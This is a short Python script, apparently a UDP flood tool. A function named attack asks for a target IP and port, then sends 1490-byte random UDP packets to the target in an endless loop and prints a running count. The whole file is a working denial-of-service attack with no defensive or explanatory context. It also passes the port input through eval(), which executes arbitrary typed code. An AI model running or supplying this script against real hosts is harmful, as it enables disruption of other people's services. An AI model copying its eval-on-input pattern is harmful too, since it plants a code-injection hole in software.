import socket
import random

def attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ip = input("insert target ip: ")
    bytes = random._urandom(1490)
    port = eval(input("insert port: "))
    count = 0
    while True:
        count += 1
        sock.sendto(bytes,(ip, port))
        print(f"send {count} packet to {ip} with port {port}")